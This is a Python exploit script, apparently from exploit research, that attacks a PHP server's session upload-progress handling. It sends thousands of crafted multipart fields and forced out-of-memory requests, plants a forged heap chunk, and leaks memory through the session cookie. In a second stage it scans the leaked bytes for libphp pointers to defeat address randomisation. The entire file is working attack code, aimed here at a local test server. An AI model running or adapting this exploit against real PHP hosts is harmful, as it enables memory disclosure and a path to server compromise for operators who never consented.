import os
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart, parse_cookie
t = Target("http://127.0.0.1:18113/index.php", timeout=120, verbose=False)
SID = b"attacksessionid0001"
def big_field(): return {"name": "big", "data": b"B" * (12 * 1024 * 1024)}
def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), big_field()]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

def stage1_reqb():
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(841):
        parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
    import struct
    forge = bytearray(b"A" * 79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    return t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)

def stage2_reqb():
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(983):
        cnt = 16 if i == 406 else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    return t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)

def oom(fields_data, n):
    parts = [{"name": f"f{i:04d}"[:5], "data": fields_data} for i in range(n)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), big_field()]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)

# Combined: stage1 (OOM + reqB) then stage2 (OOM + reqB)
rotate()
print("=== STAGE 1 (chunk base) ===")
oom(b"x", 1001)
raw1 = parse_cookie(stage1_reqb())
print(f"stage1 cookie: {len(raw1) if raw1 else 0}B")
if raw1: print("  raw:", raw1[:80].hex())

rotate()
print("=== STAGE 2 (libphp) ===")
oom(b"x" * 39, 1001)
raw2 = parse_cookie(stage2_reqb())
print(f"stage2 cookie: {len(raw2) if raw2 else 0}B")
if raw2:
    print("  raw:", raw2[:120].hex())
    # scan for libphp-range pointers
    ptrs = [int.from_bytes(raw2[i:i+8], "little") for i in range(0, len(raw2)-8, 8)]
    ptrs = [v for v in ptrs if 0x700000000000 <= v < 0x800000000000]
    print(f"  libphp-range ptrs: {len(ptrs)}")
    for p in ptrs[:10]: print(f"    0x{p:x}")
else:
    print("  NO COOKIE - checking raw response...")
    # re-run and capture raw
    oom(b"x" * 39, 1001)
    resp = stage2_reqb()
    if b"\r\n\r\n" in resp:
        head, body = resp.split(b"\r\n\r\n", 1)
    else:
        head, body = b"", resp
    print("  HEAD:", head.decode("latin1","replace")[:300])
    print("  BODY:", body[:150])
